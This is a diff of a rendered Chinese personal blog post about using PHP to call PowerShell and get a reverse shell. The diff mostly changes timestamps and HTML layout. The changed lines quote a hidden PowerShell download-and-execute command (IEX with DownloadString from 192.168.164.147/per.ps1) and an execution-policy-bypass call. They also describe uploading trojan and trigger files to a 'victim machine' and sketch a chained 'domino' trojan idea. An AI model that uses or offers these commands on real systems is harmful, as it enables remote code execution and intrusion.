@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png">
 <meta property="article:published_time" content="2020-01-13T03:38:16.000Z">
-<meta property="article:modified_time" content="2020-01-14T02:39:06.220Z">
+<meta property="article:modified_time" content="2020-01-14T03:24:16.609Z">
 <meta property="article:author" content="breakonion">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/%E6%8B%93%E6%89%91%E5%9B%BE.png">
@@ -350,15 +350,9 @@ system (&apos;powershell -ep bypass -NoLogo -NonInteractive -sta -W Hidden -NoPr
 $fileContent = “所要编码的脚本”
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
 $encodedCommand = [Convert]::ToBase64String($bytes)
-echo $encodedCommand</code></pre><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png" alt=""></br></p>
-<p>　　<br/><br>　　ops:除此之外，我还找到了另外一个比较有趣的网络攻击思路，有点类似于多米诺骨牌。<br>在我初次遇到单引号问题苦苦不能解决的时候，随着我的调整，我在本地成功执行了脚本并成功反弹了shell。但是当我把文件传到受害机器时却一直失败。我想到了通过post传参数的方式来将’cmd /c powershell.exe -sta -W Hidden -c IEX((New-Object System.Net.WebClient).DownloadString(‘<a href="http://192.168.164.147/per.ps1&#39;))&#39;当作参数来执行，结果依然不理想。" target="_blank" rel="noopener">http://192.168.164.147/per.ps1&#39;))&#39;当作参数来执行，结果依然不理想。</a> 我排查了各个环节，最终突然开窍，何必那么纠结于环境。于是我就在上传木马脚本文件之外，还上传了一个触发文件来模仿人输入CMD命令，主动点击执行木马脚本。这样就可以排除环境以及通信问题了。</p>
-<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png" alt=""></br></p>
-<p>唔~ 写到这里我的心思已经完全不在什么powershell以及php怎么触发等等。 有这样一种木马触发方式    </p>
-<pre><code>文件是可以触发的，木马是一些代码。 那么我想会有一种木马，在它真正启动之前会有N个未知的触发文件。这些触发文件每个单体都令人看不懂意图，在最终的木马触发之前人们看不懂它，它们像一个个多米诺骨牌连环被触发，这个过程的时间周期是攻击者可控的可以是几秒钟，一小时甚至几年，但最终不管哪一个被触发都会最终触发最终的木马。ps:代码积木，触发文件自启式拼组木马。 </code></pre></br>
-　　3. 命令控制
-　　此处暂且不写，以此为引我将继续探索，将我在路上的趣事不断地写在这里。
-　
-######### 5月27 10月5 12月27 &today
+echo $encodedCommand</code></pre><p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/powershellbase64.png" alt=""><br/><br>　　ops:除此之外，我还找到了另外一个比较有趣的网络攻击思路，有点类似于多米诺骨牌。<br>在我初次遇到单引号问题苦苦不能解决的时候，随着我的调整，我在本地成功执行了脚本并成功反弹了shell。但是当我把文件传到受害机器时却一直失败。我想到了通过post传参数的方式来将’cmd /c powershell.exe -sta -W Hidden -c IEX((New-Object System.Net.WebClient).DownloadString(‘hxxp://192.168.164.147/per.ps1’))’当作参数来执行，结果依然不理想。 我排查了各个环节，最终突然开窍，何必那么纠结于环境。于是我就在上传木马脚本文件之外，还上传了一个触发文件来模仿人输入CMD命令，主动点击执行木马脚本。这样就可以排除环境以及通信问题了。</p>
+<p><img src="https://raw.githubusercontent.com/breakonion/image/master/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/duominuo.png" alt=""></br><br>唔~ 写到这里我的心思已经完全不在什么powershell以及php怎么触发等等。 有这样一种木马触发方式    </p>
+<pre><code>文件是可以触发的，木马是一些代码。 那么我想会有一种木马，在它真正启动之前会有N个未知的触发文件。这些触发文件每个单体都令人看不懂意图，在最终的木马触发之前人们看不懂它，它们像一个个多米诺骨牌连环被触发，这个过程的时间周期是攻击者可控的可以是几秒钟，一小时甚至几年，但最终不管哪一个被触发都会最终触发最终的木马。ps:代码积木，触发文件自启式拼组木马。 </code></pre><p>　　3. 命令控制<br>　　此处暂且不写，以此为引我将继续探索，将我在路上的趣事不断地写在这里。<br>　<br>######### 5月27 10月5 12月27 &amp;today</p>
 
       
     </div>
@@ -370,7 +364,7 @@ echo $encodedCommand</code></pre><p><img src="https://raw.githubusercontent.com/
         <p><span>本文标题:</span><a  href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/">用PHP环境调用powershell弹个shell</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 breakonion 的个人博客">breakonion</a></p>
         <p><span>发布时间:</span>2020年01月13日 - 11时38分</p>
-        <p><span>最后更新:</span>2020年01月14日 - 10时39分</p>
+        <p><span>最后更新:</span>2020年01月14日 - 11时24分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/" title="用PHP环境调用powershell弹个shell">http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/</a>
             <span class="copy-path" data-clipboard-text="原文: http://ljg.dropsec.xyz/2020/01/13/%E7%94%A8PHP%E7%8E%AF%E5%A2%83%E8%B0%83%E7%94%A8powershell%E5%BC%B9%E4%B8%AAshell/　　作者: breakonion" title=""></span>
